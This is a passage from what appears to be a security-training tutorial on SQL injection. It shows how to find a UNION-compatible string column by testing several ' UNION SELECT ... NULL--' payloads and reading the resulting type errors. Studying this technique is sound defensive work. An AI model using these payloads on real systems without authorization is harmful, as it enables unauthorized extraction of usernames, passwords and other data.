
---
### Finding Columns with a Useful Data Type

After determining the **number of columns**, the next step is to identify which columns can hold the **data type you want to retrieve**.

For SQLi, this is commonly **string/text data**, such as usernames, emails, or passwords.

Suppose the original query returns **4 columns**.

Test each column individually by inserting a string such as `'a'`:

```
' UNION SELECT 'a',NULL,NULL,NULL--
```

```
' UNION SELECT NULL,'a',NULL,NULL--
```

```
' UNION SELECT NULL,NULL,'a',NULL--
```

```
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Interpreting the results

Suppose:

```
Column 1 → error
Column 2 → works and displays "a"
Column 3 → error
Column 4 → error
```

Then **column 2 is compatible with string data**.

You can therefore use that column to retrieve string-based information through the `UNION` query.

### Why errors occur

If a column expects an integer:

```
SELECT 1
```

but the injected query provides:

```
SELECT 'a'
```

the database may produce a type-conversion error:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

So the basic process is:

```
Determine column count
        ↓
Place 'a' in column 1
        ↓
Place 'a' in column 2
        ↓
Place 'a' in column 3
        ↓
...
        ↓
Find columns compatible with string data
```

Once a suitable column is identified, it can potentially be used to retrieve **string-valued data from other tables**.